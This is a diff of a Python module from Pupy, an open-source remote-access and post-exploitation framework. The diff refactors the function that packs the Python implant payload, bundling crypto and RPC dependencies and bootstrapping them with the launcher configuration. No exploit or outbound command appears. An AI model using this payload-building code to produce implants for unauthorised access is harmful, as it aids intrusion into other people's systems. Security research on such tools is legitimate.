@@ -3,7 +3,6 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
-import re
 import os.path
 
 from pupylib.PupyOutput import Success, Warn, Error, List
@@ -20,42 +19,23 @@ def getLinuxImportedModules():
         lines = f.read()
     return lines
 
+
 def pack_py_payload(display, conf, debug=False):
     display(Success('Generating PY payload ...'))
-    fullpayload = []
 
-    with open(os.path.join(ROOT, 'packages', 'all', 'pupyimporter.py')) as f:
-        pupyimportercode = f.read()
+    stdlib = dependencies.importer((
+        'rpyc', 'pyasn1', 'rsa', 'pyaes',
+        'netaddr', 'tinyec', 'umsgpack',
+        'poster', 'win_inet_pton', 'http_parser', 'ntlm',
+    ), ignore_native=True, as_dict=True)
 
-    fullpayload.append(
-        '\n'.join([
-            dependencies.loader(pupyimportercode, 'pupyimporter'),
-            'import pupyimporter',
-            'pupyimporter.install(debug={})'.format(repr(debug if debug is not None else False)),
-            dependencies.importer((
-                'rpyc', 'pyasn1', 'rsa', 'pyaes',
-                'netaddr', 'tinyec', 'umsgpack',
-                'poster', 'win_inet_pton', 'http_parser', 'ntlm'), ignore_native=True
-            ),
-            dependencies.importer('network', path=ROOT)
-        ]) + '\n'
+    stdlib.update(
+        dependencies.importer((
+            'network', 'pupy'
+        ), path=ROOT, as_dict=True)
     )
 
-    with open(os.path.join(ROOT, 'pp.py')) as f:
-        code = f.read()
-
-    code = re.sub(r'LAUNCHER\s*=\s*.*\n(#.*\n)*LAUNCHER_ARGS\s*=\s*.*', conf.replace('\\','\\\\'), code)
-
-    if debug:
-        fullpayload = [
-            'import logging',
-            'logging.basicConfig()',
-            'logging.getLogger().setLevel(logging.DEBUG)'
-        ] + fullpayload
-
-    fullpayload.append(code+'\n')
-
-    payload = '\n'.join(fullpayload) + '\n'
+    payload = dependencies.bootstrap(stdlib, conf) + '\n'
 
     if debug:
         return payload
